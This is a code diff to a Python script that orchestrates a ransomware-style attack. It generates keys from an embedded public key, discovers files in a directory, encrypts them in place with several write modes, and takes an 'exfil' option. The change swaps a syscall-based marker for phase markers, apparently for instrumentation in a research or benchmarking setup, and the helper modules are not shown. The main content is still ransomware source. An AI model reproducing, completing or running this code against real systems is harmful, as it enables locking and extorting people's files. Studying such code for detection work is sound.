@@ -1,14 +1,17 @@
 #!/usr/bin/python3
 import os
 import argparse
-import os
+import sys
 import time
 from datetime import datetime
 
 import discover
-import sysmark
 import fio
 import crypto
+current_dir = os.path.dirname(os.path.abspath(__file__))
+parent_dir = os.path.dirname(current_dir)
+sys.path.append(parent_dir)
+import marker
 
 EMBEDDED_PUB="2e0e6e73cc72a5bbac9ca8bc2d4487ed9588d9fd885c22db18c3e9ce7e959315"
 
@@ -37,10 +40,14 @@ def main():
     write_mode = args['write']
     currentDir = args['dir']
     exfil = args['exfil']
-    pid = int(args['verbose'])
     crypt_ext = True if args['extension'] == "default" else False
     threads = int(args['threads'])
     partial = int(args['partial'])
+    
+    try:    
+        mark_id = int(args['verbose'])
+    except ValueError:
+        mark_id = f"exec_{sym}_{keylen}_{write_mode}_{args['extension']}_{args['verbose']}_phase"
     
     match write_mode:
         case "O":
@@ -50,16 +57,16 @@ def main():
         case "WB":
             callback = fio.encrypt_file_writebefore
     
-    if pid > 0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        marker.invoke_marker(mark_id)
    
     bPub, iv_bytes, secret1, aPub_bytes = crypto.key_gen(asym, sym, AES_mode, EMBEDDED_PUB)
     fio.save_secrets(iv_bytes+secret1, aPub_bytes) # Prepend CTR/IV
 
     #files = ["000387.txt"]
     
-    if pid > 0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        marker.invoke_marker(mark_id)
     
     files = discover.discoverFiles(currentDir)
     #for f in discover.discoverFiles(currentDir):
@@ -73,8 +80,8 @@ def main():
         efile = callback(f, cipher2.encrypt, crypt_ext, needPad=padding) # Inplace/WriteAfter/WriteBefore
         fio.write_file_pubkey(efile, cPub_bytes)
     
-    if pid > 0:
-        sysmark.invoke_syscall(pid,1)
+    if mark_id != 0:
+        marker.invoke_marker(mark_id)
 
 if __name__=="__main__":
     main()
